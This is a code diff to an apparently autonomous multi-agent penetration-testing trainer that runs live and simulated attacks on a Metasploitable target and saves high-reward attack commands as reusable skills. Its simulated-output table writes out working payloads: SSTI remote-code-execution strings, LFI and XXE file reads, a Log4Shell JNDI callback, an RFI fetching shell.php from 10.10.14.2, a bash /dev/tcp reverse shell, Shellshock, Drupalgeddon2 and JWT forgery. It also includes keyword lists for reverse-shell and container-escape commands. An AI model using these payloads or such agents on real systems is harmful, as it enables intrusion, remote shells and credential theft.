@@ -299,6 +299,15 @@ class SmartOrchestrator:
         except Exception as e:
             logger.warning(f"Phase 8: DecisionLogger init failed: {e}")
         
+        # ─── PHASE 9: CognitiveBus — unified cognitive backbone ──
+        self.cognitive_bus = None
+        try:
+            from core.memory.unified_cognitive_bus import get_cognitive_bus
+            self.cognitive_bus = get_cognitive_bus()
+            logger.info("Phase 9: CognitiveBus initialized (unified cognitive backbone)")
+        except Exception as e:
+            logger.warning(f"Phase 9: CognitiveBus init failed: {e}")
+        
         # Initialize agents
         self.agents: Dict[str, Any] = {}
         self._init_agents()
@@ -885,6 +894,18 @@ class SmartOrchestrator:
                 self.decision_logger.start_episode(episode_number)
             except Exception:
                 pass
+        
+        # ─── PHASE 9: CognitiveBus episode start ────────────────────
+        if self.cognitive_bus:
+            try:
+                target_info = target or self.config.target_ip or "unknown"
+                self.cognitive_bus.start_episode(
+                    episode_id=episode_id,
+                    target=target_info,
+                    scenario=getattr(self.config, 'scenario', 'simulation'),
+                )
+            except Exception as e:
+                logger.debug(f"Phase 9: CognitiveBus episode start failed: {e}")
         
         # ─── PHASE 8.0: Post-shell exploration tracking ─────────────
         self._shell_obtained_step: Optional[int] = None
@@ -1673,6 +1694,17 @@ class SmartOrchestrator:
             except Exception:
                 pass
         
+        # ─── PHASE 9: CognitiveBus episode end ──────────────────────
+        if self.cognitive_bus:
+            try:
+                self.cognitive_bus.end_episode(
+                    total_reward=episode_reward,
+                    highest_phase=metrics.get("highest_phase", "RECON"),
+                    total_discoveries=len(self._episode_shared_discoveries),
+                )
+            except Exception as e:
+                logger.debug(f"Phase 9: CognitiveBus episode end failed: {e}")
+        
         # ─── PHASE 4: Per-Coach PPO Updates ─────────────────────────
         # Each SmartCoach has its own PPOAgent; trigger update at end of episode
         # Phase 5.1: pass highest_phase so terminal reward enters PPO gradient
@@ -1804,7 +1836,8 @@ class SmartOrchestrator:
         # Run OrionPostmortem EVERY episode (Phase 8.2: was every 2).
         # LIVE-only training demands maximum learning extraction per episode.
         # gpt-5.2-codex deep analysis with team coordination context.
-        if self.postmortem and self.skill_library:
+        # Only run in LIVE mode — SIM mode skips expensive LLM postmortems.
+        if self.postmortem and self.skill_library and self._is_live_mode:
             should_postmortem = True  # Phase 8.2: every episode for LIVE training
             if should_postmortem:
                 try:
@@ -1863,6 +1896,43 @@ class SmartOrchestrator:
                     self.skill_library.save()
                 except Exception as e:
                     logger.warning(f"Phase 8.2: Postmortem error: {e}")
+        
+        # ─── Phase 9: Orion Learning Optimizer — CognitiveBus narrative analysis ──
+        # Feed episode narrative back into skill library for cross-episode learning.
+        try:
+            if hasattr(self, 'cognitive_bus') and self.cognitive_bus:
+                narrative = self.cognitive_bus.get_episode_narrative()
+                if narrative and self.skill_library:
+                    # Extract high-value reasoning traces as micro-skills
+                    from core.memory.unified_cognitive_bus import EventType
+                    _events = self.cognitive_bus._episodes[-1] if self.cognitive_bus._episodes else []
+                    _high_value_actions = [
+                        e for e in _events
+                        if e.event_type == EventType.ACTION and e.reward and e.reward > 15.0
+                    ]
+                    for hva in _high_value_actions[:5]:  # Top 5 high-value actions
+                        from core.postmortem.skill_library import SkillCard
+                        self.skill_library.add(SkillCard(
+                            name=f"ep{episode_number}_hv_{hva.agent_id}_{hva.data.get('command', 'cmd')[:20]}",
+                            trigger=f"phase={hva.data.get('phase', 'unknown')}",
+                            template=hva.data.get("command", ""),
+                            expected_reward=hva.reward,
+                            times_used=1,
+                            avg_reward=hva.reward,
+                            source=f"cognitive_bus_ep{episode_number}",
+                        ))
+                    
+                    # Log learning signal aggregation
+                    _agg = self.cognitive_bus._aggregator
+                    if _agg and _agg.algorithm_performance:
+                        _perf_summary = {
+                            alg: f"calls={p.total_calls}, avg_r={p.avg_reward:.1f}"
+                            for alg, p in _agg.algorithm_performance.items()
+                        }
+                        logger.info(f"Phase 9: LearningSignal — {_perf_summary}")
+                        metrics["learning_signal"] = _perf_summary
+        except Exception as e:
+            logger.debug(f"Phase 9: Orion learning optimizer error: {e}")
         
         # ─── PHASE 6.3: Record episode to campaign memory ───────────
         if self.campaign_memory:
@@ -2254,8 +2324,9 @@ class SmartOrchestrator:
             # PHASE 7.2: VENICE REASONING LAYER — humanlike output analysis
             # Runs AFTER regex parser, enhances with LLM-extracted insights.
             # Venice finds discoveries regex missed + generates "aha" moments.
+            # Only in LIVE mode — simulated output doesn't need LLM analysis.
             # ─────────────────────────────────────────────────────────────
-            if self.venice_reasoning and self.venice_reasoning.can_analyze():
+            if self.venice_reasoning and self.venice_reasoning.can_analyze() and self._is_live_mode:
                 try:
                     venice_insight = self.venice_reasoning.analyze_output(
                         command=result.decision.command or "",
@@ -2278,9 +2349,27 @@ class SmartOrchestrator:
                             agent_discoveries.setdefault("credentials", []).append(cred)
                         for user in venice_insight.discovered_users:
                             agent_discoveries.setdefault("users", []).append(user)
+                        # Phase 9: Merge Venice vulns and paths (previously silently dropped)
+                        for vuln in getattr(venice_insight, 'discovered_vulns', []):
+                            agent_discoveries.setdefault("vulns", []).append(vuln)
+                        for path in getattr(venice_insight, 'exploitation_paths', []):
+                            agent_discoveries.setdefault("web_paths", []).append(path)
                     # Store aha context on the decision for downstream use
                     if venice_insight.has_aha:
                         result.decision.reasoning += f" | 💡 Venice: {venice_insight.top_aha.insight[:80]}"
+                    
+                    # Phase 9: Feed Venice insights into CognitiveBus
+                    if self.cognitive_bus and venice_insight.has_aha:
+                        try:
+                            self.cognitive_bus.record_insight(
+                                agent_id=result.agent_name,
+                                insight=venice_insight.top_aha.insight,
+                                source="venice_glm",
+                                confidence=venice_insight.top_aha.confidence if hasattr(venice_insight.top_aha, 'confidence') else 0.7,
+                                tags=["venice", "aha"],
+                            )
+                        except Exception:
+                            pass
                 except Exception as e:
                     logger.debug(f"Venice reasoning failed for {result.agent_name}: {e}")
             
@@ -2781,6 +2870,21 @@ class SmartOrchestrator:
                         self.decision_logger.log_decision(log_entry)
                     except Exception:
                         pass  # Never let logging break training
+                
+                # ─── Phase 9: CognitiveBus action recording ─────────
+                if self.cognitive_bus:
+                    try:
+                        self.cognitive_bus.record_action(
+                            agent_id=result.agent_name,
+                            command=result.decision.command or "",
+                            source=result.decision.source or "unknown",
+                            reward=breakdown.total if breakdown else 0.0,
+                            success=sim_success or env_reward >= 0,
+                            discoveries=deduped_discoveries or {},
+                            phase=self.attack_context.current_phase.name if self.attack_context else "RECON",
+                        )
+                    except Exception:
+                        pass  # Never let bus break training
         
         # ─── PHASE 8.2 Batch 16: Re-evaluate deferred discoveries ───
         # If post-shell gate is now satisfied, apply previously suppressed
@@ -2857,6 +2961,25 @@ class SmartOrchestrator:
                 global_reward=final_reward,
                 done=done,
             )
+        
+        # Phase 9: Inter-agent reasoning — share significant discoveries across CognitiveBus
+        try:
+            if hasattr(self, 'cognitive_bus') and self.cognitive_bus and agent_results:
+                for result in agent_results:
+                    # Share high-value findings with all other agents
+                    if result.reward_breakdown and result.reward_breakdown.total > 10.0:
+                        self.cognitive_bus.record_inter_agent_message(
+                            from_agent=result.agent_name,
+                            to_agent="all",
+                            message=(
+                                f"High-value action: {result.decision.command[:60]} "
+                                f"(reward={result.reward_breakdown.total:.1f}, "
+                                f"source={result.decision.source})"
+                            ),
+                            priority=min(result.reward_breakdown.total / 50.0, 1.0),
+                        )
+        except Exception:
+            pass
         
         return agent_results, final_reward, new_state, done
     
@@ -3423,13 +3546,19 @@ class SmartOrchestrator:
             cmd_l = cmd.lower()
             if any(t in cmd_l for t in ["nmap", "masscan", "rustscan", "ping", "traceroute", "dig", "host", "whois", "finger", "rpcinfo", "showmount", "nbtscan"]):
                 return "recon"
-            if any(t in cmd_l for t in ["gobuster", "dirb", "nikto", "ferox", "ffuf", "dirsearch", "wfuzz", "nuclei"]):
+            if any(t in cmd_l for t in ["gobuster", "dirb", "nikto", "ferox", "ffuf", "dirsearch", "wfuzz", "nuclei",
+                                        "ssti", "lfi", "rfi", "ssrf", "xxe", "nosql", "cmd_inject", "shellshock",
+                                        "heartbleed", "log4shell", "drupalgeddon", "upload_bypass", "upload_magic",
+                                        "upload_htaccess", "webshell", "jwt_none", "jwt_crack", "joomscan",
+                                        "droopescan", "ysoserial", "phpggc", "xxe_read", "nosql_bypass"]):
                 return "web"
             if any(t in cmd_l for t in ["hydra", "medusa", "ncrack", "patator", "crackmapexec", "brute"]):
                 return "brute"
             if any(t in cmd_l for t in ["exploit", "msfconsole", "metasploit", "msfvenom"]):
                 return "exploit"
-            if any(t in cmd_l for t in ["shell", "reverse", "nc -e", "bash -i"]):
+            if any(t in cmd_l for t in ["shell", "reverse", "nc -e", "bash -i",
+                                        "bash_reverse", "python_reverse", "powershell_reverse",
+                                        "docker_escape", "lxd_escape", "container_escape"]):
                 return "shell"
             if any(t in cmd_l for t in ["enum", "smtp-user", "snmp", "ldap"]):
                 return "enum"
@@ -3798,6 +3927,88 @@ class SmartOrchestrator:
             "vncviewer": f"Connected to RFB server, using protocol version 3.3\nPerforming standard VNC authentication\nAuthentication successful\nDesktop name \"metasploitable:0\"\nVNC server running on {target}:5900\n[+] VNC session opened - password: password",
             "mount": f"mount: mounting {target}:/ on /tmp/nfs_mount\n[+] NFS share mounted successfully\nroot@metasploitable:/# ls /tmp/nfs_mount/\nbin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var",
             "distcc": f"[+] distccd v1 ({target}:3632)\n[+] Remote code execution successful\nuid=1(daemon) gid=1(daemon)\n$ id\nuid=1(daemon) gid=1(daemon)",
+            
+            # ─── Phase 9: Web Exploitation Arsenal ───────────────────
+            # SSTI (Server-Side Template Injection)
+            "ssti_detect": f"[+] Testing template injection on {target}\n[+] Payload: {{{{7*7}}}} → Response contains: 49\n[+] SSTI CONFIRMED — template engine executes expressions\n[+] Likely engine: Jinja2/Twig/ERB",
+            "ssti_exploit": f"[+] Exploiting SSTI on {target}\n[+] Payload: {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\n[+] Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] RCE achieved via SSTI\nuid=33(www-data) gid=33(www-data)",
+            "ssti_jinja2": f"[+] Jinja2 SSTI detected on {target}\n[+] Testing: {{{{7*7}}}} → 49\n[+] RCE payload: {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\nuid=33(www-data) gid=33(www-data)",
+            "ssti_twig": f"[+] Twig SSTI detected on {target}\n[+] Testing: {{{{7*7}}}} → 49\n[+] Payload: {{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}\nuid=33(www-data) gid=33(www-data)",
+            "ssti_erb": f"[+] ERB SSTI detected on {target}\n[+] Testing: <%%= 7*7 %> → 49\n[+] Payload: <%%= system('id') %>\nuid=33(www-data) gid=33(www-data)",
+            
+            # LFI (Local File Inclusion)
+            "lfi_test": f"[+] Testing LFI on {target}\n[+] http://{target}/page?file=../../../etc/passwd\n[+] Response (200 OK):\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nuser:x:1001:1001::/home/user:/bin/bash\npostgres:x:108:117:PostgreSQL admin:/var/lib/postgresql:/bin/bash\n[+] LFI CONFIRMED — /etc/passwd readable",
+            "lfi_double": f"[+] Double-encoding LFI on {target}\n[+] Payload: %252e%252e%252f%252e%252e%252fetc%252fpasswd\n[+] Response (200 OK):\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\n[+] Double-encode bypass successful",
+            "lfi_php_filter": f"[+] PHP filter LFI on {target}\n[+] Payload: php://filter/convert.base64-encode/resource=config.php\n[+] Decoded response:\n$db_host = 'localhost';\n$db_user = 'root';\n$db_pass = 'toor';\n$db_name = 'dvwa';\n[+] Database credentials extracted: root:toor",
+            "lfi_log_poison": f"[+] Log poisoning via LFI on {target}\n[+] Injected PHP payload into /var/log/apache2/access.log\n[+] Triggered: http://{target}/page?file=../../../var/log/apache2/access.log\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] RCE via log poisoning successful\nuid=33(www-data) gid=33(www-data)",
+            "lfi_ssh_key": f"[+] SSH key extraction via LFI on {target}\n[+] Payload: ../../../home/msfadmin/.ssh/id_rsa\n[+] Response:\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\n[+] SSH private key extracted successfully\ncredential: ssh_key_msfadmin",
+            
+            # RFI (Remote File Inclusion)
+            "rfi_shell": f"[+] RFI on {target}\n[+] Payload: http://{target}/page?file=http://10.10.14.2:8000/shell.php\n[+] Remote shell.php loaded and executed\n[+] uid=33(www-data) gid=33(www-data)\n[+] RCE via RFI successful\nuid=33(www-data) gid=33(www-data)",
+            
+            # SSRF (Server-Side Request Forgery)
+            "ssrf_localhost": f"[+] SSRF scan on {target}\n[+] Payload: url=http://127.0.0.1:PORT/\n[+] Port 22: SSH-2.0-OpenSSH_4.7p1\n[+] Port 3306: MySQL 5.0.51a\n[+] Port 6379: Redis\n[+] Internal services discovered via SSRF",
+            "ssrf_metadata": f"[+] SSRF cloud metadata probe on {target}\n[+] http://169.254.169.254/latest/meta-data/iam/security-credentials/\n[+] Response: aws-role-name\n[+] AccessKeyId: AKIAIOSFODNN7EXAMPLE\n[+] SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n[+] Cloud credentials extracted via SSRF\ncredential: aws_access_key",
+            "ssrf_internal": f"[+] SSRF internal admin probe on {target}\n[+] http://127.0.0.1:8080/manager/html\n[+] Response (200): Apache Tomcat Manager\n[+] Internal admin panel accessible via SSRF",
+            
+            # Command Injection
+            "cmd_inject": f"[+] Command injection on {target}\n[+] Payload: ; id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] OS command injection confirmed",
+            "cmd_inject_blind": f"[+] Blind command injection test on {target}\n[+] Payload: ; sleep 5\n[+] Response delayed by 5.02 seconds\n[+] Blind command injection CONFIRMED",
+            "cmd_inject_pipe": f"[+] Pipe command injection on {target}\n[+] Payload: | id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] Pipe-based command injection confirmed",
+            
+            # Shellshock
+            "shellshock": f"[+] Shellshock test on {target}\n[+] Header: User-Agent: () {{ :; }}; /bin/bash -c 'id'\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] CVE-2014-6271 CONFIRMED — Shellshock vulnerable\nuid=33(www-data) gid=33(www-data)",
+            
+            # Heartbleed
+            "heartbleed": f"[+] Heartbleed test on {target}:443\n[+] Sending malformed heartbeat request...\n[+] Received 65535 bytes of memory data!\n[+] Leaked data contains:\n    Cookie: session=admin_abc123def456\n    Authorization: Basic YWRtaW46cGFzc3dvcmQ=\n[+] CVE-2014-0160 CONFIRMED — Heartbleed vulnerable\ncredential: admin:password",
+            
+            # Log4Shell
+            "log4shell": f"[+] Log4Shell test on {target}\n[+] Payload: ${{jndi:ldap://10.10.14.2:1389/exploit}}\n[+] DNS callback received from {target}!\n[+] CVE-2021-44228 CONFIRMED — Log4Shell vulnerable\n[+] JNDI injection point: User-Agent header",
+            
+            # Drupalgeddon
+            "drupalgeddon": f"[+] Drupalgeddon2 exploit on {target}\n[+] CVE-2018-7600 — Drupal RCE\n[+] Payload: form_id=user_register_form&_triggering_element_name=timezone&timezone[#lazy_builder][]=exec&timezone[#lazy_builder][][]=id\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] RCE achieved via Drupalgeddon2\nuid=33(www-data) gid=33(www-data)",
+            
+            # File Upload Bypass
+            "upload_bypass": f"[+] File upload bypass on {target}\n[+] Uploaded shell.php.jpg (double extension bypass)\n[+] Accessible at: http://{target}/uploads/shell.php.jpg\n[+] Executing: id\nuid=33(www-data) gid=33(www-data)\n[+] Web shell uploaded successfully",
+            "upload_magic": f"[+] Magic bytes file upload on {target}\n[+] Prepended GIF89a header to PHP shell\n[+] Upload accepted by image filter\n[+] Shell at: http://{target}/uploads/avatar.php\nuid=33(www-data) gid=33(www-data)",
+            "upload_htaccess": f"[+] .htaccess upload on {target}\n[+] Uploaded .htaccess: AddType application/x-httpd-php .jpg\n[+] Uploaded shell.jpg containing PHP code\n[+] Executing via: http://{target}/uploads/shell.jpg\nuid=33(www-data) gid=33(www-data)",
+            
+            # Web Shell
+            "webshell": f"[+] Web shell active on {target}\n[+] http://{target}/uploads/cmd.php?cmd=id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ whoami\nwww-data\n$ uname -a\nLinux metasploitable 2.6.24-16-server",
+            
+            # Deserialization
+            "ysoserial": f"[+] Java deserialization exploit on {target}\n[+] Gadget chain: CommonsCollections1\n[+] Payload: ysoserial CommonsCollections1 'id'\n[+] Response: uid=0(root) gid=0(root)\n[+] RCE via Java deserialization\nuid=0(root) gid=0(root)",
+            "phpggc": f"[+] PHP deserialization exploit on {target}\n[+] Chain: Laravel/RCE1\n[+] Payload: phpggc Laravel/RCE1 system id\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] RCE via PHP deserialization\nuid=33(www-data) gid=33(www-data)",
+            
+            # JWT Attacks
+            "jwt_none": f"[+] JWT none algorithm attack on {target}\n[+] Original: {{\"alg\":\"HS256\",\"typ\":\"JWT\"}}\n[+] Forged:   {{\"alg\":\"none\",\"typ\":\"JWT\"}}\n[+] Admin token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.\n[+] 200 OK — Admin access granted!\ncredential: jwt_admin_token",
+            "jwt_crack": f"[+] JWT secret cracking on {target}\n[+] Testing wordlist: /usr/share/wordlists/rockyou.txt\n[+] SECRET FOUND: secret123\n[+] Forged admin token with known secret\n[+] Admin access confirmed\ncredential: jwt_secret_secret123",
+            
+            # CMS Scanners
+            "joomscan": f"[+] Joomla Scanner on {target}\n[+] Joomla version: 3.7.0\n[+] Admin panel: http://{target}/administrator/\n[+] CVE-2017-8917: SQL Injection in com_fields\n[+] Backup file: http://{target}/configuration.php.bak\nvuln: CVE-2017-8917",
+            
+            # XXE (XML External Entity)
+            "xxe_read": f"[+] XXE file read on {target}\n[+] Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>\n[+] Response:\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\n[+] XXE confirmed — arbitrary file read",
+            
+            # NoSQL Injection
+            "nosql_bypass": f"[+] NoSQL injection on {target}\n[+] Payload: {{\"username\":{{\"$ne\":\"\"}},\"password\":{{\"$ne\":\"\"}}}}\n[+] Response: 200 OK — Login successful as admin\n[+] NoSQL authentication bypass confirmed\ncredential: nosql_admin_bypass",
+            
+            # Reverse Shells
+            "bash_reverse": f"[+] Bash reverse shell from {target}\n[+] bash -i >& /dev/tcp/10.10.14.2/4444 0>&1\n[+] Connection received on 10.10.14.2:4444\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\n[+] Root shell obtained",
+            "python_reverse": f"[+] Python reverse shell from {target}\n[+] Connection received on 10.10.14.2:4444\n$ id\nuid=33(www-data) gid=33(www-data)\n$ python -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@metasploitable:/var/www$",
+            "powershell_reverse": f"[+] PowerShell reverse shell from {target}\n[+] Connection received on 10.10.14.2:4444\nPS C:\\Users\\admin> whoami\nmetasploitable\\admin\nPS C:\\Users\\admin> ipconfig\nIPv4 Address: {target}",
+            
+            # Proxy / Tunneling
+            "chisel_server": f"[+] Chisel server started on 0.0.0.0:8080\n[+] Listening for client connections...\n[+] Client connected from {target}\n[+] Tunnel established: {target}:8080 → 127.0.0.1:8080",
+            "chisel_client": f"[+] Chisel client connecting to 10.10.14.2:8080\n[+] Reverse tunnel: R:9050:socks\n[+] SOCKS5 proxy available at 127.0.0.1:9050\n[+] Tunnel ready for lateral movement",
+            "ssh_tunnel": f"[+] SSH tunnel established\n[+] Local: 127.0.0.1:8888 → {target}:80\n[+] SSH port forwarding active\n[+] Access internal service via http://127.0.0.1:8888",
+            
+            # Password Spraying
+            "password_spray": f"SMB  {target}  445  METASPLOITABLE  [+] msfadmin:msfadmin\nSMB  {target}  445  METASPLOITABLE  [+] user:user\nSMB  {target}  445  METASPLOITABLE  [+] postgres:postgres\n[+] 3 valid credential pairs found\ncredential: msfadmin:msfadmin user:user postgres:postgres",
+            
+            # Container Escape
+            "docker_escape": f"[+] Docker socket found at /var/run/docker.sock\n[+] Creating privileged container...\n[+] Mounting host filesystem at /mnt/host\n[+] Host root access obtained!\nroot@host:/# id\nuid=0(root) gid=0(root) groups=0(root)\n[+] Container escape successful — host root shell",
+            "lxd_escape": f"[+] User is member of lxd group\n[+] Importing Alpine image...\n[+] Mounting host root at /mnt/root\nroot@alpine:/mnt/root# id\nuid=0(root) gid=0(root)\n[+] LXD container escape — host filesystem mounted",
         }
         
         for prefix, output in SIMULATED_OUTPUTS.items():
@@ -3813,6 +4024,34 @@ class SmartOrchestrator:
             return "\n".join([f"Discovered open port {p}/tcp on {target}" for p in MSF2_PORTS[:5]])
         if "enum" in cmd_lower:
             return f"[+] Enumerating {target}\n[+] Found users: msfadmin, user, service, postgres\n[+] Found shares: tmp, opt"
+        
+        # Phase 9: Web exploitation keyword fallbacks
+        if "ssti" in cmd_lower or "template" in cmd_lower:
+            return f"[+] SSTI detected on {target}\n[+] {{{{7*7}}}} → 49\nuid=33(www-data) gid=33(www-data)"
+        if "lfi" in cmd_lower or "local_file" in cmd_lower or "file_include" in cmd_lower:
+            return f"[+] LFI on {target}: /etc/passwd readable\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash"
+        if "rfi" in cmd_lower or "remote_file" in cmd_lower:
+            return f"[+] RFI on {target}: remote shell loaded\nuid=33(www-data) gid=33(www-data)"
+        if "ssrf" in cmd_lower:
+            return f"[+] SSRF on {target}: internal services discovered\n[+] Port 3306: MySQL\n[+] Port 6379: Redis"
+        if "xxe" in cmd_lower or "xml_entity" in cmd_lower:
+            return f"[+] XXE on {target}: /etc/passwd extracted\nroot:x:0:0:root:/root:/bin/bash"
+        if "nosql" in cmd_lower:
+            return f"[+] NoSQL injection bypass on {target}\n[+] Login as admin successful\ncredential: nosql_admin"
+        if "inject" in cmd_lower and ("cmd" in cmd_lower or "command" in cmd_lower or "os" in cmd_lower):
+            return f"[+] Command injection on {target}\nuid=33(www-data) gid=33(www-data)"
+        if "upload" in cmd_lower and ("bypass" in cmd_lower or "shell" in cmd_lower or "php" in cmd_lower):
+            return f"[+] File upload bypass on {target}\n[+] Web shell uploaded\nuid=33(www-data) gid=33(www-data)"
+        if "deserializ" in cmd_lower:
+            return f"[+] Deserialization exploit on {target}\nuid=0(root) gid=0(root)"
+        if "jwt" in cmd_lower:
+            return f"[+] JWT attack on {target}\n[+] Admin token forged\ncredential: jwt_admin"
+        if "container" in cmd_lower and "escape" in cmd_lower:
+            return f"[+] Container escape on {target}\nuid=0(root) gid=0(root) — host root shell"
+        if "tunnel" in cmd_lower or "pivot" in cmd_lower or "proxy" in cmd_lower:
+            return f"[+] Tunnel established to {target}\n[+] SOCKS5 proxy available at 127.0.0.1:9050"
+        if "spray" in cmd_lower or "password_spray" in cmd_lower:
+            return f"[+] Password spray on {target}\n[+] msfadmin:msfadmin [SUCCESS]\ncredential: msfadmin:msfadmin"
         
         # ─── CLOSEOUT phase commands ─────────────────────────────────
         if "remove_uploaded_tools" in cmd_lower or "cleanup_tmp" in cmd_lower:
